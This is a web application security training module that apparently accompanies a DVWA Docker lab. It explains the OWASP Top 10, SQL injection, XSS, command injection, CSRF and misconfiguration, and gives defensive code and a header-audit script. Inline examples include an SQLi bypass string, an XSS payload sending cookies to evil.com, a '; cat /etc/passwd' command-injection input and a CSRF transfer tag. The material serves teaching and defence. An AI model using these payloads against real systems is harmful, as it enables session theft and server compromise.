SEC-WEB01.1 — The OWASP Top 10: The Vulnerability Roadmap

The OWASP (Open Web Application Security Project) Top 10 is the most widely recognized classification of web application security risks. Updated every few years based on real-world data from thousands of organizations, it represents the vulnerabilities that are most commonly found and most frequently exploited in web applications worldwide. Think of it as the "most wanted list" of web security bugs. If you can find and fix these ten categories of vulnerabilities, you have addressed the vast majority of web application security risk.

This module covers the four most hands-on, immediately exploitable categories through your Docker lab: Injection (SQL injection, command injection), Cross-Site Scripting (XSS), Broken Access Control (including CSRF), and Security Misconfiguration (exposed admin panels, default credentials, directory listings). These four categories alone account for the majority of web application breaches.

The OWASP Top 10 (2021 edition): A01: Broken Access Control — users can act beyond their intended permissions (IDOR, privilege escalation, CSRF). A02: Cryptographic Failures — sensitive data exposed due to weak encryption or missing HTTPS. A03: Injection — untrusted input interpreted as commands (SQL injection, OS command injection, LDAP injection). A04: Insecure Design — fundamental design flaws that cannot be fixed by implementation (missing rate limiting, lack of input validation architecture). A05: Security Misconfiguration — default credentials, unnecessary features enabled, verbose error messages, missing security headers. A06: Vulnerable and Outdated Components — known-vulnerable libraries and frameworks (the Apache version nmap found in your lab). A07: Identification and Authentication Failures — weak passwords, missing MFA, session fixation. A08: Software and Data Integrity Failures — insecure CI/CD, unverified updates (supply chain attacks). A09: Security Logging and Monitoring Failures — attacks go undetected because logging is insufficient. A10: Server-Side Request Forgery (SSRF) — the server is tricked into making requests to internal resources. Your Docker lab covers A01, A03, A05, and A07 extensively through DVWA's challenge categories.

SEC-WEB01.2 — SQL Injection: Breaking Into Databases

SQL injection (SQLi) is the single most dangerous web vulnerability. It happens when a web application takes user input and pastes it directly into a database query without checking or escaping it. Imagine a librarian who takes your request and reads it aloud to the library system verbatim. If you request "Find me books by Smith", the system works normally. But if you request "Find me books by Smith; now delete all records", and the librarian reads the ENTIRE request to the system without thinking, the system deletes all records. That is SQL injection — your input stops being data and becomes a command.

A successful SQL injection can let an attacker read the entire database (all usernames, passwords, credit cards, personal data), modify data (change passwords, promote their account to admin), delete data (drop tables, wipe records), or in some cases execute operating system commands through the database server. It is catastrophic, and it is shockingly common — even in 2026, new SQLi vulnerabilities are discovered in production applications daily.

Vulnerable code constructs an SQL query by concatenating user input: query = "SELECT * FROM users WHERE id = '" + user_input + "'". If user_input is 1, the query becomes SELECT * FROM users WHERE id = '1' — correct. If user_input is 1' OR '1'='1, the query becomes SELECT * FROM users WHERE id = '1' OR '1'='1' — which is always true, returning ALL rows. The attacker has broken out of the data context (the quoted string) into the SQL command context. From there, UNION SELECT lets you read data from any table, information_schema reveals the database structure, and database-specific functions like LOAD_FILE() (MySQL) or xp_cmdshell (MSSQL) can interact with the file system or execute OS commands. SQLi types: In-band (results displayed in the page — easiest), Blind (no visible output, but behavior changes based on true/false conditions — extract data one bit at a time), Out-of-band (data exfiltrated through DNS or HTTP requests from the database server).

The root cause of SQL injection is a violation of the principle of least privilege at the syntactic level: user-supplied data is placed into a context where it can be interpreted as code. The parser for the SQL query language does not distinguish between the developer's intended query structure and the attacker's injected commands because they are presented as a single string. The fix is parameterized queries (prepared statements), which separate the query structure from the data at the protocol level. With prepared statements, the SQL parser compiles the query template first (with ? placeholders), creating a fixed execution plan. User data is then sent in a separate protocol message and bound to the placeholders — it is NEVER parsed as SQL, regardless of its content. Even if the user supplies '; DROP TABLE users; --, the database treats the entire string as a literal value for the placeholder, not as SQL commands. This is fundamentally different from escaping (which tries to neutralize special characters but can be bypassed through encoding tricks, double-encoding, or parser inconsistencies). Parameterized queries are the ONLY reliable defense against SQL injection.

🛡️ Defense: How to Prevent SQL Injection

The ONLY reliable fix is parameterized queries (prepared statements). Never build SQL queries by concatenating strings. Here is the vulnerable code versus the fixed code:

php — vulnerable vs secure
// ❌ VULNERABLE — user input concatenated into query
$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";
// If id = 1' OR '1'='1  → dumps ALL users

// ✅ SECURE — parameterized query (prepared statement)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
// If id = 1' OR '1'='1  → searches for literal string "1' OR '1'='1"
// The injected SQL is treated as DATA, never as CODE

SEC-WEB01.3 — Cross-Site Scripting (XSS): Injecting JavaScript

Cross-Site Scripting (XSS) is the injection of malicious JavaScript into web pages viewed by other users. If SQL injection attacks the server's database, XSS attacks the user's browser. When an application takes user input and displays it back on a page without properly sanitizing it, an attacker can inject JavaScript code that runs in every user's browser when they view that page. This JavaScript can steal session cookies (hijacking their login), redirect them to phishing sites, modify the page content they see, capture their keystrokes, or perform actions on their behalf.

There are three types. Reflected XSS: the malicious script is part of the URL or form submission and is immediately reflected back in the response — the victim must click a crafted link. Stored XSS: the malicious script is saved to the database (e.g., in a forum post, comment, or profile field) and displayed to every user who views that page — much more dangerous because it persists. DOM-based XSS: the vulnerability is in client-side JavaScript that processes URL parameters without sanitization, never sending the payload to the server.

XSS exploits the browser's trust model: the browser executes any JavaScript that comes from the page's origin, regardless of who actually wrote it. If an attacker can inject <script>document.location='http://evil.com/?c='+document.cookie</script> into a page, the browser executes it with the victim's session context, sending their authentication cookies to the attacker's server. The attacker can then use these cookies to impersonate the victim. Defenses: (1) Output encoding — convert < to &lt;, > to &gt;, etc., before inserting user data into HTML (context-dependent — HTML, JavaScript, URL, and CSS each need different encoding). (2) Content Security Policy (CSP) — HTTP header that restricts which scripts the browser will execute (Content-Security-Policy: script-src 'self' blocks all inline scripts). (3) HTTPOnly cookies — the HttpOnly flag on session cookies prevents JavaScript from reading them (the nmap scan in Brick 17 found this flag missing on DVWA). (4) Modern frameworks (React, Angular, Vue) auto-escape output by default, dramatically reducing XSS risk — but developers can still bypass the protection with functions like dangerouslySetInnerHTML.

🛡️ Defense: How to Prevent XSS

defense — xss prevention
# ═══ 1. Output Encoding (escape HTML special characters) ═══
# PHP: htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
# Python: from markupsafe import escape; escape(input)
# JavaScript: textContent instead of innerHTML
# Converts < to &lt; and > to &gt; — the browser shows them as text, not tags

# ═══ 2. Content Security Policy (HTTP header) ═══
# Content-Security-Policy: default-src 'self'; script-src 'self'
# This tells the browser: only execute scripts from our own domain
# Inline scripts (including injected ones) are blocked

# ═══ 3. HttpOnly Cookies ═══
# Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure; SameSite=Strict
# HttpOnly → JavaScript cannot read the cookie (blocks cookie theft)
# Secure → cookie only sent over HTTPS
# SameSite=Strict → cookie not sent with cross-site requests (blocks CSRF)

# ═══ 4. Modern Frameworks (React, Angular, Vue) ═══
# Auto-escape output by default
# React: {userInput} is auto-escaped; dangerouslySetInnerHTML is not
# NEVER use dangerouslySetInnerHTML with user input

SEC-WEB01.4 — Command Injection: Executing System Commands

Command injection is the most devastating web vulnerability — it lets an attacker run arbitrary operating system commands on the web server. If SQL injection gives access to the database, command injection gives access to the entire machine. It happens when a web application passes user input to a system command (like ping, nslookup, or convert) without sanitizing it. The attacker injects shell metacharacters (;, |, &&, $(), backticks) to chain their own commands onto the legitimate one.

Think of it like this: the application asks the server "ping this address for me" and passes along whatever address the user typed. If the user types 8.8.8.8; cat /etc/passwd, the server runs ping 8.8.8.8; cat /etc/passwd — the semicolon ends the ping command and starts a new one that reads the password file. From there, an attacker can read files, create backdoors, download malware, pivot to other systems, or take complete control.

Command injection vectors exploit shell metacharacters that chain or substitute commands: ; (command separator), | (pipe — second command receives first's output), || (run second if first fails), && (run second if first succeeds), $(cmd) or `cmd` (command substitution — execute and substitute output), $((expr)) (arithmetic expansion), and newline characters (%0a URL-encoded). Defenses: (1) Never pass user input to system commands. Use language-native libraries instead (Python's socket module instead of calling ping, PHP's gethostbyname() instead of calling nslookup). (2) If you must use system commands, use parameterized execution (subprocess.run(['ping', '-c', '1', user_input]) in Python — the input is passed as a list element, not parsed by the shell). (3) Never use shell=True in Python's subprocess or backtick execution in PHP with user input. (4) Input validation with a strict allowlist (only allow IP address characters: digits and dots).

defense — command injection prevention

SEC-WEB01.5 — CSRF: Tricking Users Into Actions

Cross-Site Request Forgery (CSRF) tricks a logged-in user's browser into making requests to a vulnerable application on the attacker's behalf. The user does not know anything is happening. Imagine you are logged into your bank. While browsing another website, that website contains a hidden form that submits a money transfer request TO your bank. Because you are already logged in (your browser has the session cookie), the bank processes the transfer as if you initiated it. The attacker never needed your password — they just needed you to visit their page while logged into the bank.

CSRF works because browsers automatically attach cookies (including session cookies) to every request sent to a domain, regardless of which website initiated the request. The bank cannot distinguish between a request you deliberately made and one that was triggered by a malicious page.

CSRF attack flow: (1) Victim logs into vulnerable-app.com (browser stores session cookie). (2) Victim visits evil-page.com (while still logged into vulnerable-app.com). (3) evil-page.com contains <img src="http://vulnerable-app.com/transfer?to=attacker&amount=1000"> or a hidden auto-submitting form. (4) Browser sends the request TO vulnerable-app.com WITH the victim's session cookie. (5) vulnerable-app.com processes it as a legitimate request from the victim. Defenses: (1) Anti-CSRF tokens — server generates a unique random token per session/form, embeds it as a hidden field, and validates it on submission. The attacker cannot know the token value. (2) SameSite cookies — SameSite=Strict prevents the browser from sending cookies with cross-site requests entirely. SameSite=Lax allows cookies for top-level navigations but blocks them for embedded requests (images, iframes, forms). (3) Referer/Origin header validation — check that the request originated from the same site. (4) Re-authentication for sensitive operations — require password confirmation for password changes, money transfers, etc.

SEC-WEB01.6 — Security Misconfiguration: The Low-Hanging Fruit

Security misconfiguration is not a single vulnerability — it is an entire category of mistakes that leave systems unnecessarily exposed. These are the "obvious" issues that attackers check for first because they require zero skill to exploit: default passwords left unchanged, admin panels accessible to the internet, directory listings enabled, verbose error messages revealing internal paths and stack traces, unnecessary services running, and missing security headers. Your nmap scan from Brick 17 already found several of these on DVWA — exposed phpinfo(), directory listings, and missing security headers. Fixing misconfigurations is often the highest-impact, lowest-effort security improvement you can make.

Common misconfigurations found in real penetration tests: (1) Default credentials — admin/admin, admin/password, root/root on admin panels, databases, and network devices. (2) Directory listings — web server shows all files in a directory when no index file exists (your nmap http-enum found /icons/). (3) Exposed admin panels — /admin, /wp-admin, /manager, /phpmyadmin accessible without IP restriction. (4) Verbose errors — stack traces, SQL error messages, and internal paths displayed to users (the SQL error in Section 2 is a misconfiguration that helped the attacker). (5) Missing HTTP security headers — no CSP, no X-Frame-Options, no X-Content-Type-Options. (6) Unnecessary features — PHP info pages, debug modes, test accounts left in production. (7) Outdated software — the Apache 2.4.59 version nmap found should be checked against CVEs. Tools for finding these: nmap's http-enum, Gobuster/Feroxbuster for directory brute-forcing, Nikto for web server misconfiguration scanning, and manual inspection of response headers.

bash — finding misconfigurations
# ═══ Check HTTP Security Headers ═══

echo "═══ Security Header Audit ═══"
for port in 3000 8081 8082; do
    echo "--- Port $port ---"
    headers=$(curl -sI --max-time 3 "http://localhost:$port")

    echo "$headers" | grep -qi "content-security-policy" && \
        echo "  ✓ CSP header present" || echo "  ✗ CSP header MISSING"
    echo "$headers" | grep -qi "x-frame-options" && \
        echo "  ✓ X-Frame-Options present" || echo "  ✗ X-Frame-Options MISSING (clickjacking risk)"
    echo "$headers" | grep -qi "x-content-type-options" && \
        echo "  ✓ X-Content-Type-Options present" || echo "  ✗ X-Content-Type-Options MISSING"
    echo "$headers" | grep -qi "strict-transport" && \
        echo "  ✓ HSTS present" || echo "  ✗ HSTS MISSING (HTTPS downgrade risk)"
done

🌸🛡️ Module Complete — You Are Now Dangerous (Ethically)! You can now find and exploit the four most common web application vulnerability categories. SQL injection lets you break into databases by injecting SQL commands through user input — you can extract all data, modify records, and sometimes execute system commands. XSS lets you inject JavaScript into web pages to steal sessions, redirect users, and capture keystrokes — with reflected XSS requiring a crafted link and stored XSS persisting for all visitors. Command injection lets you execute arbitrary system commands when applications pass user input to shell commands — the most devastating vulnerability giving full server access. Critically, for every attack you learned the defense: parameterized queries for SQLi, output encoding + CSP + HttpOnly for XSS, avoiding system commands + parameterized execution for command injection, anti-CSRF tokens + SameSite cookies for CSRF, and security header configuration for misconfigs.
